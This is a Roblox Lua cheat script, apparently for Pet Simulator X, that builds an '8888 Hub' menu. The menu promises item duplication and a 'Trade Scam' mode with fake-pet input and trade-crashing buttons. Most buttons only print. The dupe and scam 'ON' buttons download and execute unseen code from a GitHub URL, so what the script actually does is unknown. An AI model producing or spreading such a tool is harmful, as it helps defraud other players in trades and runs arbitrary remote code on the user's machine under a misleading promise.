local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "[✨SHINY] UPDATE - PSX PRIVATE V3.8", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

local Tab = Window:MakeTab({
        Name = "Info",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
    
    local Section = Tab:AddSection({
        Name = "Credits"
    })
    
    Tab:AddParagraph("Made By 8888 Team","Owner Masqta_#6880")
    
   local Section = Tab:AddSection({
        Name = "Status"   
     })
     
   Tab:AddParagraph("DUPE: Working!","")
   
   Tab:AddParagraph("TRADE SCAM: Working!","")
 
   local Section = Tab:AddSection({
        Name = "Update"   
     })
   
   Tab:AddParagraph("[✨SHINY] UPDATE!","Version 3.8!")

         
      local Tab = Window:MakeTab({
        Name = "Dupe",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
  
    
    local Section = Tab:AddSection({
        Name = "Dupe Section"
    })
    
    
    Tab:AddButton({
        Name = "Start Dupe!",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/info.lua"))()
          end    
    })
    
    local Section = Tab:AddSection({
	Name = "Dupe Options"
})
     
     Tab:AddSlider({
	Name = "Select Pets Limits",
	Min = 0,
	Max = 20,
	Default = 5,
	Color = Color3.fromRGB(254,255,255),
	Increment = 1,
	ValueName = "PETS",
	Callback = function(Value)
		print(Value)
	end    
})
     
    Tab:AddToggle({
	Name = "Dupe Gems",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
}) 

     Tab:AddTextbox({
        Name = "Rename all pets",
        Default = "Text Goes here",
        TextDisappear = true,
        Callback = function(Value)
            print(Value)
        end	  
    })
  
    local Tab = Window:MakeTab({
        Name = "Trade Scam",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
    
    Tab:AddLabel("Make sure that your in trade before enabled Trade Scam")

    local Section = Tab:AddSection({
	Name = "ON/OFF"
    })

    Tab:AddButton({
        Name = "ON",
        Default = false,
        Callback = function(Value)
             loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/info.lua"))()
        end    
    })

    Tab:AddButton({
        Name = "OFF",
        Default = false,
        Callback = function(Value)
             print("button pressed")
        end    
    })

    local Section = Tab:AddSection({
	Name = "Trades Options"
    })

    Tab:AddTextbox({
	Name = "Fake Pets Input",
	Default = "Input name of Pet",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})
  
  Tab:AddButton({
	Name = "Crash Player Trade",
	Callback = function()
      		print("button pressed")
  	end    
})

    Tab:AddParagraph("More Coming Soon!","See you in the feture!")
    
    local Tab = Window:MakeTab({
	Name = "Bank",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
    
    local Section = Tab:AddSection({
	Name = "Bank Section"
})
 
    Tab:AddButton({
	Name = "💵 Open Bank",
	Callback = function()
      		print("button pressed")
  	end    
})
    
    
    Tab:AddButton({
	Name = "❌ Cancel Outgoing Invites!",
	Callback = function()
      		print("button pressed")
  	end    
})
 
     local Section = Tab:AddSection({
	Name = "Anti-Scam"
})
     
     Tab:AddParagraph("Anti-Scam","Coming Soon!")
    

    
        OrionLib:MakeNotification({
	Name = "Thanks for using 8888 Hub!",
	Content = "Version 3.8",
	Image = "rbxassetid://4483345998",
	Time = 5
})


OrionLib:Init()

